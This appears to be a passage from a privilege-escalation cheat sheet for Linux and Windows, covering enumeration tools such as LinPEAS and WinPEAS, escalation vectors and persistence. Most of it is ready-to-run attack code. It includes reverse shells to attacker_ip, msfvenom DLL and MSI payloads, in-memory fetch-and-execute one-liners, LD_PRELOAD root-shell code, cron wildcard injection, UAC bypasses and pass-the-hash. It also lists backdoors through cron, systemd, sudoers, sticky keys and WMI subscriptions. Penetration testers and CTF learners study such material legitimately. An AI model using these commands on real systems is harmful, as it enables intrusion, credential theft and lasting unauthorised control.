**Transfer Methods for LinPEAS**

```bash
# Method 1: HTTP Server on attacker machine
# Attacker
python3 -m http.server 8000

# Target
wget http://attacker_ip:8000/linpeas.sh
curl http://attacker_ip:8000/linpeas.sh | sh

# Method 2: Base64 encoding (no file write needed)
# Attacker - encode script
base64 -w0 linpeas.sh > linpeas_b64.txt

# Target - decode and execute
echo "BASE64_STRING_HERE" | base64 -d | sh

# Method 3: Direct execution from GitHub (if target has internet)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Method 4: netcat transfer
# Attacker
nc -lvnp 4444 < linpeas.sh

# Target
nc attacker_ip 4444 > linpeas.sh

# Method 5: Using SCP (if SSH available)
scp linpeas.sh user@target:/tmp/
```

**Key Areas LinPEAS Checks**

```bash
# System Information
# - OS version and kernel
# - Current user and groups
# - Environment variables
# - PATH misconfigurations

# Container Detection
# - Docker
# - LXC/LXD
# - Kubernetes

# Cloud Detection
# - AWS
# - Azure
# - Google Cloud

# Processes and Services
# - Running processes
# - Cron jobs
# - Systemd timers
# - Services
# - Sockets

# Network Information
# - Network interfaces
# - Open ports
# - Firewall rules
# - Active connections

# User Information
# - User accounts
# - Password policies
# - Sudoers configuration
# - User history files

# Software Information
# - Installed packages
# - Vulnerable software
# - Development tools

# File Permissions
# - SUID/SGID binaries
# - Writable files
# - Capabilities
# - ACLs

# Interesting Files
# - Configuration files
# - Credentials in files
# - Database files
# - SSH keys
# - Backup files
```

**Parsing LinPEAS Output**

```bash
# Run LinPEAS and save output
./linpeas.sh -a > linpeas_full.txt

# Extract high-priority findings (99% and 95% likely exploitable)
grep -E "99%|95%" linpeas_full.txt

# Extract SUID binaries
grep -A 100 "SUID - Check" linpeas_full.txt | grep -v "^$"

# Extract sudo permissions
grep -A 50 "Sudo version" linpeas_full.txt

# Extract writable directories
grep -A 100 "Writable" linpeas_full.txt | grep "drwx"

# Extract passwords found in files
grep -i "password" linpeas_full.txt

# Extract interesting environment variables
grep -A 20 "Environment" linpeas_full.txt

# Extract CVEs
grep "CVE-" linpeas_full.txt
```

**LinPEAS Priority Indicators**

[Inference] LinPEAS uses color coding and percentage indicators to show likelihood of exploitability:

- **99%** - Red - Almost certainly exploitable
- **95%** - Red/Yellow - Very likely exploitable
- **Interesting** - Yellow - Potentially useful
- **Info** - Blue - Informational only

**WinPEAS - Windows Privilege Escalation**

**Installation and Basic Usage**

```bash
# Download WinPEAS (on attacker machine)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat
```

```powershell
# On target Windows machine

# Method 1: Direct download and execute
IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip:8000/winPEAS.bat')

# Method 2: Download executable
certutil -urlcache -f http://attacker_ip:8000/winPEASx64.exe winpeas.exe
.\winpeas.exe

# Method 3: PowerShell download
Invoke-WebRequest -Uri "http://attacker_ip:8000/winPEASx64.exe" -OutFile "winpeas.exe"
.\winpeas.exe

# Method 4: In-memory execution (if AV is present)
IEX(IWR http://attacker_ip:8000/winPEAS.bat -UseBasicParsing)
```

**WinPEAS Execution Options**

```cmd
REM Basic execution
winPEASx64.exe

REM Quiet mode (less output)
winPEASx64.exe quiet

REM Fast mode (skip time-consuming checks)
winPEASx64.exe fast

REM Full enumeration
winPEASx64.exe full

REM Search for specific strings
winPEASx64.exe searchall password

REM Wait before executing (for debugging)
winPEASx64.exe wait

REM Output to file
winPEASx64.exe > output.txt

REM Specific checks only
winPEASx64.exe systeminfo
winPEASx64.exe userinfo
winPEASx64.exe processinfo
winPEASx64.exe servicesinfo
winPEASx64.exe applicationsinfo
winPEASx64.exe networkinfo
winPEASx64.exe windowscreds
winPEASx64.exe browserinfo
winPEASx64.exe filesinfo
```

**PowerShell WinPEAS Execution**

```powershell
# Basic execution
.\winPEAS.exe

# With output redirection
.\winPEAS.exe | Out-File -Encoding ASCII winpeas_output.txt

# Run with specific checks
.\winPEAS.exe cmd systeminfo,userinfo,processinfo

# Bypass execution policy (if needed)
powershell.exe -ExecutionPolicy Bypass -File winPEAS.ps1

# Run from URL (in-memory)
IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip:8000/winPEAS.ps1')
```

**Key Areas WinPEAS Checks**

```bash
# System Information
# - OS version and architecture
# - Hostname and domain
# - Installed updates and patches
# - PowerShell version

# User Information
# - Current user privileges
# - User groups
# - Privilege constants
# - Token information

# Processes
# - Running processes
# - Process permissions
# - Unquoted service paths
# - DLL hijacking opportunities

# Services
# - Service permissions
# - Modifiable services
# - Vulnerable services
# - Service binary permissions

# Applications
# - Installed software
# - Running applications
# - Application vulnerabilities

# Network Information
# - Network adapters
# - Open ports
# - Active connections
# - Firewall configuration

# Credentials
# - Windows credentials
# - Browser credentials
# - WiFi passwords
# - Cached credentials
# - Credential manager

# Files and Registry
# - Interesting files
# - Registry auto-runs
# - AlwaysInstallElevated
# - Recycle bin
# - Recent documents
```

**Common WinPEAS Findings and Exploitation**

```powershell
# Unquoted Service Path
# If WinPEAS finds: C:\Program Files\Vulnerable App\service.exe
# Create: C:\Program.exe or C:\Program Files\Vulnerable.exe

# Service Binary Permissions
# If WinPEAS shows writable service binary
# Replace with malicious executable
copy malicious.exe "C:\Path\To\Service.exe"
sc stop VulnerableService
sc start VulnerableService

# DLL Hijacking
# If WinPEAS finds missing DLL in write-able location
# Create malicious DLL with same name
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll -o hijack.dll

# AlwaysInstallElevated
# If WinPEAS shows both registry keys set to 1
# Create MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi

# Scheduled Tasks with Writable Scripts
# If WinPEAS finds writable scheduled task scripts
# Replace with malicious script

# Registry AutoRun with Writable Path
# If WinPEAS finds writable AutoRun registry path
# Replace with malicious executable
```

**Parsing WinPEAS Output**

```powershell
# Save output
.\winPEAS.exe > winpeas_output.txt

# Search for high-priority findings
Select-String -Path winpeas_output.txt -Pattern "99%|95%"

# Find passwords
Select-String -Path winpeas_output.txt -Pattern "password|pwd|pass" -CaseSensitive:$false

# Find writable services
Select-String -Path winpeas_output.txt -Pattern "Writable" -Context 2,5

# Find AutoLogon credentials
Select-String -Path winpeas_output.txt -Pattern "AutoLogon" -Context 0,10

# Find unquoted service paths
Select-String -Path winpeas_output.txt -Pattern "Unquoted"
```

#### Sherlock

Sherlock is a PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities on Windows systems.

**Installation and Usage**

```powershell
# Download Sherlock
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')

# Alternative - download to file
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1" -OutFile "Sherlock.ps1"

# Import module
Import-Module .\Sherlock.ps1

# Run all checks
Find-AllVulns

# Run from memory (one-liner)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'); Find-AllVulns
```

**Vulnerabilities Sherlock Checks**

```powershell
# Sherlock checks for these known privilege escalation vulnerabilities:

# MS10-015 - User Mode to Ring (KiTrap0D)
# MS10-092 - Task Scheduler
# MS13-053 - NTUserMessageCall Win32k Kernel Pool Overflow
# MS13-081 - TrackPopupMenuEx Win32k NULL Page
# MS14-058 - TrackPopupMenu Win32k Null Pointer Dereference
# MS15-051 - ClientCopyImage Win32k
# MS15-078 - Font Driver Buffer Overflow
# MS16-016 - 'mrxdav.sys' WebDAV
# MS16-032 - Secondary Logon Handle
# MS16-034 - Windows Kernel-Mode Drivers EoP
# MS16-135 - Win32k Elevation of Privilege
# CVE-2017-7199 - Nessus Agent 6.6.2 - 6.10.3 Priv Esc
```

**Individual Vulnerability Checks**

```powershell
# Check specific vulnerabilities
Find-MS10015
Find-MS10092
Find-MS13053
Find-MS13081
Find-MS14058
Find-MS15051
Find-MS15078
Find-MS16016
Find-MS16032
Find-MS16034
Find-MS16135
Find-CVE20177199
```

**Output and Interpretation**

```powershell
# Run Sherlock and save output
Find-AllVulns | Out-File sherlock_output.txt

# Typical output format:
# [*] Title: MS16-032
# [*] MSBulletin: https://technet.microsoft.com/en-us/library/security/ms16-032
# [*] CVEID: CVE-2016-0099
# [*] Appears Vulnerable: True

# Parse results for vulnerable findings
Get-Content sherlock_output.txt | Select-String "Vulnerable: True" -Context 3,0
```

**Modern Alternative - Watson**

[Inference] Sherlock is no longer maintained. Watson is a modern alternative that checks for missing KBs that may lead to privilege escalation.

```bash
# Download Watson (on attacker machine)
wget https://github.com/rasta-mouse/Watson/releases/download/v2.0/Watson.exe

# Transfer to target
certutil -urlcache -f http://attacker_ip:8000/Watson.exe Watson.exe
```

```powershell
# Run Watson
.\Watson.exe

# Watson checks for these (and more):
# CVE-2019-0836 - AppXSvc Hard Link
# CVE-2019-0841 - BITS Arbitrary File Move
# CVE-2019-1064 - AppXSvc Hard Link
# CVE-2019-1130 - DWM Core Library Privilege Escalation
# CVE-2019-1253 - AppXSvc Hard Link
# CVE-2019-1315 - WIN32K Privilege Escalation
# CVE-2020-0668 - Service Tracing Arbitrary File Move
# CVE-2020-0683 - MSI Wrapper Local Privilege Escalation
# CVE-2020-1013 - Print Spooler Privilege Escalation
```

#### Comprehensive Privilege Escalation Workflow

**Linux Privilege Escalation Methodology**

```bash
#!/bin/bash
# linux_privesc_workflow.sh

echo "[*] Starting Linux Privilege Escalation Enumeration"

# 1. System Information
echo "[+] System Information"
uname -a
cat /etc/issue
cat /etc/*-release
hostname

# 2. Current User Information
echo "[+] Current User"
whoami
id
groups

# 3. Sudo Permissions
echo "[+] Checking sudo permissions"
sudo -l

# 4. SUID Binaries
echo "[+] Finding SUID binaries"
find / -perm -4000 -type f 2>/dev/null

# 5. Writable Directories
echo "[+] Finding writable directories"
find / -writable -type d 2>/dev/null | grep -v "/proc" | grep -v "/sys"

# 6. Capabilities
echo "[+] Checking capabilities"
getcap -r / 2>/dev/null

# 7. Cron Jobs
echo "[+] Checking cron jobs"
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# 8. Process Monitoring (for running scripts)
echo "[+] Monitoring processes (10 seconds)"
old_ps=$(ps aux)
sleep 10
new_ps=$(ps aux)
diff <(echo "$old_ps") <(echo "$new_ps") | grep "[\>\<]" | grep -v "ps aux"

# 9. Network Information
echo "[+] Network information"
ifconfig || ip a
netstat -antup 2>/dev/null || ss -antup 2>/dev/null

# 10. Running LinPEAS (if available)
if [ -f "./linpeas.sh" ]; then
    echo "[+] Running LinPEAS"
    ./linpeas.sh -a | tee linpeas_output.txt
else
    echo "[-] LinPEAS not found, download from:"
    echo "    https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
fi

echo "[*] Enumeration complete. Check output for privilege escalation vectors."
```

**Windows Privilege Escalation Methodology**

```powershell
# windows_privesc_workflow.ps1

Write-Host "[*] Starting Windows Privilege Escalation Enumeration" -ForegroundColor Green

# 1. System Information
Write-Host "[+] System Information" -ForegroundColor Yellow
systeminfo
whoami /all
hostname

# 2. Network Information
Write-Host "[+] Network Information" -ForegroundColor Yellow
ipconfig /all
route print
netstat -ano

# 3. User and Group Information
Write-Host "[+] User Information" -ForegroundColor Yellow
net user
net localgroup
net localgroup Administrators

# 4. Installed Software
Write-Host "[+] Installed Software" -ForegroundColor Yellow
wmic product get name,version

# 5. Running Processes
Write-Host "[+] Running Processes" -ForegroundColor Yellow
tasklist /SVC
Get-Process | Select-Object Name,Id,Path

# 6. Services
Write-Host "[+] Services" -ForegroundColor Yellow
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
Get-Service | Where-Object {$_.Status -eq "Running"}

# 7. Scheduled Tasks
Write-Host "[+] Scheduled Tasks" -ForegroundColor Yellow
schtasks /query /fo LIST /v

# 8. Check for Unquoted Service Paths
Write-Host "[+] Checking for Unquoted Service Paths" -ForegroundColor Yellow
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# 9. Registry AutoRuns
Write-Host "[+] Registry AutoRuns" -ForegroundColor Yellow
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# 10. AlwaysInstallElevated Check
Write-Host "[+] Checking AlwaysInstallElevated" -ForegroundColor Yellow
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 11. Saved Credentials
Write-Host "[+] Checking for Saved Credentials" -ForegroundColor Yellow
cmdkey /list
dir C:\Users\*\AppData\Local\Microsoft\Credentials\* 2>$null
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\* 2>$null

# 12. Run WinPEAS (if available)
if (Test-Path ".\winPEAS.exe") {
    Write-Host "[+] Running WinPEAS" -ForegroundColor Yellow
    .\winPEAS.exe > winpeas_output.txt
} else {
    Write-Host "[-] WinPEAS not found" -ForegroundColor Red
}

# 13. Run Sherlock/Watson (if available)
if (Test-Path ".\Sherlock.ps1") {
    Write-Host "[+] Running Sherlock" -ForegroundColor Yellow
    Import-Module .\Sherlock.ps1
    Find-AllVulns | Out-File sherlock_output.txt
}

Write-Host "[*] Enumeration complete" -ForegroundColor Green
```

#### Additional Privilege Escalation Tools

**Linux-Specific Tools**

```bash
# LinEnum - Linux enumeration script
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t

# Linux Smart Enumeration (LSE)
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh -l 2

# Unix-privesc-check
wget https://github.com/pentestmonkey/unix-privesc-check/raw/1_x/unix-privesc-check
chmod +x unix-privesc-check
./unix-privesc-check standard

# pspy - Process monitoring without root
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64

# LinuxExploitSuggester
wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

**Windows-Specific Tools**

```powershell
# PowerUp - PowerShell privilege escalation tool
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks

# Seatbelt - C# enumeration tool
.\Seatbelt.exe -group=all

# Windows Exploit Suggester - Next Generation

python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only

# AccessChk - Sysinternals tool for permissions

accesschk.exe /accepteula -uwcqv "Authenticated Users" * accesschk.exe /accepteula -uwdqs Users c:  
accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

# Invoke-PrivescAudit

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/hausec/Invoke-PrivescAudit/master/Invoke-PrivescAudit.ps1') Invoke-PrivescAudit

# SharpUp - C# port of PowerUp

.\SharpUp.exe audit

````

#### Common Privilege Escalation Vectors

**Linux Privilege Escalation Vectors**

```bash
# 1. Kernel Exploits
# Check kernel version
uname -a
cat /proc/version

# Search for exploits
searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# Common kernel exploits for CTF:
# Dirty COW (CVE-2016-5195)
# Dirty Pipe (CVE-2022-0847)
# PwnKit (CVE-2021-4034)

# 2. SUID Binary Exploitation
# Already covered in GTFOBins section

# 3. Sudo Misconfigurations
# Check sudo version for vulnerabilities
sudo -V | grep "Sudo version"

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit - sudo < 1.9.5p2)
# Use exploit-db exploits

# LD_PRELOAD trick (when env_keep+=LD_PRELOAD)
cat > shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so apache2

# 4. Cron Jobs Exploitation
# Writable cron job script
cat /etc/crontab
ls -la /etc/cron.*

# If writable, replace with reverse shell
echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /path/to/cron/script.sh

# PATH manipulation in cron
# If PATH is writable, create malicious binary
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' > /tmp/malicious_command
chmod +x /tmp/malicious_command
export PATH=/tmp:$PATH

# Wildcard injection in tar cron jobs
# If cron runs: cd /backup && tar czf backup.tar.gz *
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# 5. NFS Root Squashing
# Check NFS exports
cat /etc/exports
showmount -e target_ip

# If no_root_squash is set
# On attacker machine (as root):
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cd /tmp/nfs
cp /bin/bash .
chmod +s bash
# On target, execute: /share/bash -p

# 6. Docker/LXD Group Membership
# If user is in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# If user is in lxd group
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
cd /mnt/root/root

# 7. Writable /etc/passwd
# If /etc/passwd is writable
openssl passwd -1 -salt salt password123
echo 'newroot:$1$salt$qmQxq7p5pvFQSyHQCPyAR0:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot

# 8. Capabilities Abuse
# Python with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# 9. PATH Hijacking
# If script runs commands without absolute paths
echo "/bin/bash" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# Wait for script to run or trigger it

# 10. Shared Library Hijacking
# Find programs loading libraries from writable locations
ldd /path/to/program

# Create malicious library
cat > exploit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /writable/path/library.so exploit.c
````

**Windows Privilege Escalation Vectors**

```powershell
# 1. Unquoted Service Path
# Find unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """

# Exploitation
# If path is: C:\Program Files\Vulnerable Service\service.exe
# Create: C:\Program.exe or C:\Program Files\Vulnerable.exe
copy malicious.exe "C:\Program.exe"

# Restart service (if possible)
sc stop "VulnerableService"
sc start "VulnerableService"

# Alternative - wait for reboot or service restart

# 2. Service Binary Permissions
# Check service binary permissions
icacls "C:\Path\To\Service.exe"
accesschk.exe /accepteula -quvw "C:\Path\To\Service.exe"

# If writable, replace with malicious binary
copy malicious.exe "C:\Path\To\Service.exe"
sc stop ServiceName
sc start ServiceName

# 3. Service Registry Permissions
# Check service registry permissions
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\ServiceName

# If writable, modify ImagePath
reg add "HKLM\System\CurrentControlSet\Services\ServiceName" /v ImagePath /t REG_EXPAND_SZ /d "C:\path\to\malicious.exe" /f

# 4. AlwaysInstallElevated
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 0x1
# Create MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o shell.msi

# Install
msiexec /quiet /qn /i shell.msi

# 5. DLL Hijacking
# Find missing DLLs using Process Monitor or manually
# Check writable directories in PATH
icacls C:\Windows\System32
icacls C:\Windows

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll -o hijack.dll

# Place in writable location in search path
copy hijack.dll "C:\Program Files\Application\missing.dll"

# 6. Registry AutoRun
# Check AutoRun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# If writable, add malicious entry
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\path\to\malicious.exe" /f

# 7. Scheduled Tasks
# List scheduled tasks
schtasks /query /fo LIST /v

# Check task file permissions
icacls C:\Path\To\Task\Script.bat

# If writable, replace with malicious script
echo "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip/shell.ps1')" > C:\Path\To\Task\Script.bat

# 8. Token Impersonation
# Check privileges
whoami /priv

# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is enabled
# Use tools like:

# JuicyPotato (Windows Server 2016 and earlier)
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -t *

# PrintSpoofer (Windows 10, Server 2019)
.\PrintSpoofer.exe -i -c cmd

# RoguePotato
.\RoguePotato.exe -r attacker_ip -e "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999

# GodPotato (Windows Server 2012 - 2022)
.\GodPotato.exe -cmd "cmd /c whoami"

# 9. Saved Credentials
# Check for saved credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:Administrator "cmd.exe /c C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"

# Check credential files
dir /s *credential* == C:\Users\
dir /s *.kdbx == C:\Users\

# 10. Pass-the-Hash
# If you have NTLM hash
pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:hash //target_ip cmd.exe

# Using CrackMapExec
crackmapexec smb target_ip -u administrator -H hash

# 11. Windows Kernel Exploits
# Run Sherlock/Watson to identify missing patches
# Common exploits:

# MS16-032 (Secondary Logon Service)
powershell.exe -ExecutionPolicy Bypass -File MS16-032.ps1

# MS15-051 (ClientCopyImage)
.\ms15-051x64.exe "cmd /c whoami"

# CVE-2021-1675 (PrintNightmare)
# Use exploit from GitHub

# 12. Insecure GUI Applications Running as SYSTEM
# Look for applications running as SYSTEM with GUI
tasklist /v /fo csv | findstr /i "system"

# If application allows file browsing (e.g., Help -> Open)
# Navigate to C:\Windows\System32\
# Right-click address bar -> Copy as text
# Paste: cmd.exe
# Press Enter (opens elevated cmd)

# 13. UAC Bypass
# If user is in Administrators group but UAC is enabled

# Method 1: fodhelper.exe bypass
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f
fodhelper.exe

# Method 2: eventvwr.exe bypass
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f
eventvwr.exe

# 14. Password Mining
# Search for passwords in files
findstr /si password *.txt *.xml *.ini *.config

# PowerShell password search
Get-ChildItem C:\ -Recurse -Include *.txt,*.xml,*.config,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern "password" -CaseSensitive:$false

# Search registry for passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Check Group Policy Preferences (GPP)
# Look for Groups.xml with cpassword attribute
findstr /S /I cpassword \\target\sysvol\*.xml

# Decrypt GPP password
gpp-decrypt encrypted_password
```

#### Post-Exploitation - Maintaining Elevated Access

**Linux Persistence**

```bash
# Add user to sudoers
echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# Add SSH key
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Create SUID shell
cp /bin/bash /tmp/.hidden_shell
chmod 4755 /tmp/.hidden_shell

# Add cron job backdoor
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'" >> /etc/crontab

# Create systemd service
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
```

**Windows Persistence**

```powershell
# Create local administrator
net user backdoor Password123! /add
net localgroup Administrators backdoor /add

# Registry Run key
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# Scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru System

# Service creation
sc create Backdoor binPath= "C:\Windows\Temp\backdoor.exe" start= auto
sc start Backdoor

# Sticky Keys backdoor
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
# Now press Shift 5 times at login screen for SYSTEM shell

# WMI Event Subscription
# Create malicious script
$script = "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip/shell.ps1')"

# Create WMI filter (trigger on login)
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemUpdate";
    EventNamespace = "root\cimv2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Create WMI consumer
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SystemUpdateConsumer";
    CommandLineTemplate = $script
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter;
    Consumer = $Consumer
}
```

#### Automated Privilege Escalation Scripts

**Linux One-Liner Enumeration**

```bash
# Quick manual checks (no tools)
(whoami; id; uname -a; cat /etc/issue; sudo -l; find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab; ls -la /etc/cron.*) 2>&1 | tee quick_enum.txt

# Download and run LinPEAS in one line
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Alternative with wget
wget -q -O - https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Windows One-Liner Enumeration**

```powershell
# Quick manual checks
systeminfo; whoami /all; net user; net localgroup Administrators; wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "C:\Windows"; reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run; reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run; cmdkey /list

# Download and run WinPEAS
IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip:8000/winPEAS.bat')

# Run Sherlock in memory
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'); Find-AllVulns
```

#### Privilege Escalation Cheat Sheet

**Linux Quick Reference**

```bash
# Information Gathering
whoami; id; hostname; uname -a
cat /etc/passwd; cat /etc/group; cat /etc/shadow
sudo -l; cat /etc/sudoers
find / -perm -4000 2>/dev/null  # SUID
find / -perm -2000 2>/dev/null  # SGID
getcap -r / 2>/dev/null  # Capabilities
cat /etc/crontab; crontab -l; ls -la /etc/cron.*
ps aux | grep root
netstat -tulnp; ss -tulnp

# Common Exploits
# SUID bash: bash -p
# SUID find: find . -exec /bin/sh -p \; -quit
# SUID vim: vim -c ':!/bin/sh'
# Sudo LD_PRELOAD: LD_PRELOAD=/path/to/lib.so sudo program
# NFS no_root_squash: mount + cp bash + chmod +s
# Docker group: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Writable /etc/passwd: echo 'root2:hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# Tools to Run
./linpeas.sh
./LinEnum.sh
./lse.sh
./pspy64
```

**Windows Quick Reference**

```powershell
# Information Gathering
systeminfo; hostname; whoami /all
net user; net localgroup; net localgroup Administrators
wmic qfe list  # Installed patches
wmic product get name,version  # Installed software
tasklist /SVC; Get-Process
wmic service get name,pathname,startmode
schtasks /query /fo LIST /v
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
cmdkey /list; dir C:\Users\*\AppData\Local\Microsoft\Credentials\

# Common Exploits
# Unquoted service path: Create exe in intermediate directory
# AlwaysInstallElevated: msiexec /i malicious.msi
# Token impersonation: JuicyPotato/PrintSpoofer/GodPotato
# Service permissions: sc config service binPath= "malicious.exe"
# Scheduled task writable: Replace script with malicious code
# UAC bypass: fodhelper.exe or eventvwr.exe registry modification

# Tools to Run
.\winPEAS.exe
.\Sherlock.ps1; Find-AllVulns
.\Watson.exe
Import-Module .\PowerUp.ps1; Invoke-AllChecks
.\Seatbelt.exe -group=all
.\accesschk.exe /accepteula
```

#### Important Related Topics

**Critical subtopics for comprehensive privilege escalation:**

- **Kernel exploit development** - Understanding and compiling kernel exploits for specific versions
- **Active Directory privilege escalation** - Kerberoasting, AS-REP roasting, DCSync, and delegation attacks
- **Container escape techniques** - Breaking out of Docker, LXC/LXD, and Kubernetes containers
- **Post-exploitation frameworks** - Empire, Covenant, and Metasploit post-exploitation modules
